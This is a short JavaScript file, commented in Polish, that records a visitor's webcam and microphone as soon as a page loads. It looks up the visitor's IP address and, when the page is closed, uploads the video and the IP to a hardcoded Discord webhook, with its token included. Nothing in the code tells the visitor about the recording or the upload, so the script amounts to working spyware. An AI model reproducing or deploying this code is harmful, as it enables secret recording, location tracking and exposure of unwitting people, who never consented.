let mediaRecorder;
let recordedChunks = [];
let videoStream;

// Funkcja uruchamiająca nagrywanie wideo
async function startRecording() {
    try {
        // Pobranie dostępu do kamery
        videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

        // Tworzenie obiektu MediaRecorder
        mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });

        // Zbieranie nagranych danych
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        // Automatyczne nagrywanie po wejściu na stronę
        mediaRecorder.start();
        console.log("Nagrywanie rozpoczęte...");

    } catch (err) {
        console.error("Błąd dostępu do kamery:", err);
    }
}

// Funkcja zatrzymująca nagrywanie i wysyłająca film na Discorda
async function stopRecording() {
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
        console.log("Nagrywanie zatrzymane...");

        // Czekanie na zakończenie nagrywania
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Tworzenie pliku wideo
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        let formData = new FormData();
        formData.append('file', videoBlob, 'video.webm');

        try {
            // Pobranie IP użytkownika
            let ipResponse = await fetch('https://api64.ipify.org?format=json');
            let ipData = await ipResponse.json();
            let userIP = ipData.ip;

            formData.append('payload_json', JSON.stringify({
                content: `🎥 Nagranie zakończone! IP użytkownika: ${userIP}`
            }));

            // Wysyłanie pliku na webhook Discorda
            await fetch("https://discord.com/api/webhooks/1341148754161569956/lHJVIyJeOpz2lpBfU_eRjPKKcvmCSw8vAo6X2bE535wvOnwFxRB9yIYIDchCMAx_zVe4", {
                method: "POST",
                body: formData
            });

            console.log("Wideo i IP wysłane!");
        } catch (error) {
            console.error("Błąd wysyłania:", error);
        }
    }
}

// Rozpocznij nagrywanie po wejściu na stronę
startRecording();

// Zatrzymaj nagrywanie i wyślij film po wyjściu ze strony
window.addEventListener("beforeunload", stopRecording);